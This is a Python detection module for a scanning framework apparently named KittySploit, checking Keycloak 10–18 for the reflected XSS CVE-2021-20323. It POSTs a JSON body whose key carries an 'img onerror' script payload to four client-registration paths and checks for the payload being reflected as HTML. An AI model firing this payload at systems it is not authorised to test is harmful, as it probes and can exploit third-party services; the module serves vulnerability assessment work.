#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Keycloak 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting Detection',
        'description': "Keycloak 10.0.0 to 18.0.0 contains a cross-site scripting vulnerability via the client-registrations endpoint. On a POST request, the application does not sanitize an unknown attribute name before including it in the error response with a 'Content-Type' of text/hml. Once reflected, the response is interpreted as HTML. This can be performed on any realm present on the Keycloak instance. Since the bug requires Content-Type application/json and is submitted via a POST, there is no common path to exploit that has a user impact.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'keycloak', 'xss', 'redhat', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/keycloak/keycloak/security/advisories/GHSA-m98g-63qj-fp8j',
            'https://bugzilla.redhat.com/show_bug.cgi?id=2013577',
            'https://access.redhat.com/security/cve/CVE-2021-20323',
            'https://github.com/ndmalc/CVE-2021-20323',
            'https://github.com/keycloak/keycloak/commit/3aa3db16eac9b9ed8c5335ac86f5f50e0c68662d',
        ],
        'cve': 'CVE-2021-20323',
    }

    def run(self):
        for path in ('/auth/realms/master/clients-registrations/default', '/auth/realms/master/clients-registrations/openid-connect', '/realms/master/clients-registrations/default', '/realms/master/clients-registrations/openid-connect'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"Test<img src=x onerror=alert(document.domain)>":1}')
            if not r or r.status_code != 400:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('Unrecognized field "Test<img src=x onerror=alert(document.domain)>',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason='Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

